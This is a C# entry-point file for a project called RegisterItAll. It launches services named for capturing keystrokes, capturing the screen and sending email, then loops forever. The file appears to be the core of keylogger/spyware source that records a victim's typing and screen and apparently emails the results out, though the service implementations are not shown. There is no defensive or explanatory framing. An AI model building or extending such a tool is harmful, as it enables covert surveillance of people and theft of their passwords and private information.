using RegisterItAll.Services;
using RegisterItAll.Services.Base;

namespace RegisterItAll
{
    public static class Program
    {
        public static void Main(string[] args)
        {
            Service[] servicesToRun = new Service[]
            {
                new EmailSenderService(),
                new KeystrokesCapturerService(),
                new ScreenCapturerService(),
            };

            foreach (Service service in servicesToRun)
            {
                service.Run();
            }

            while (true) { }
        }
    }
}